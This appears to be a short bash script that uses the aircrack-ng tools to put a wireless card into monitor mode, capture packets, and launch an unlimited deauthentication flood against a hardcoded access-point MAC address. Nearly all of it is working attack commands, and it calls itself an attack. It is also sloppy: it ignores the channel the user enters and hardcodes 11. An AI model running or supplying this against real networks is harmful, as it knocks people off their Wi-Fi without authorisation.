//idea of the project is very well thought of
#!/bin/bash 

echo " ANSWER THE QUESTIONS IN Y AND N "

echo "The current network card active is :--"
echo " " 
iwconfig wlp0s20f3| grep wlp
echo " "
echo "Do you want to change the network card into monitor mode"
read ans
if [ $ans = 'Y' ]
then 
	echo "Changing the card to monitor mode"
	airmon-ng start wlp0s20f3
else
	echo "Exsiting from the attack"
fi

echo "Perfrom the raw packet capuring"
read packet
if [ $packet = 'Y' ]
then 
	sudo airodump-ng wlp0s20f3mon
	sleep 2
else
	echo "Exiting from the attack"
fi

echo "Changing the channel "
echo "Enter the chnnel you want to change to which the wifi is present "
read channel

airodump-ng wlp0s20f3mon -c 11

echo "Channel changed to 11"

echo "Initializing the attack on Y WIFI press ctlr+z to exit in 5 sec"

sleep 5

echo "Attack in action press ctrl+z to ABORT"
aireplay-ng wlp0s20f3mon --deauth 0 -a 34:E9:11:73:AB:7B



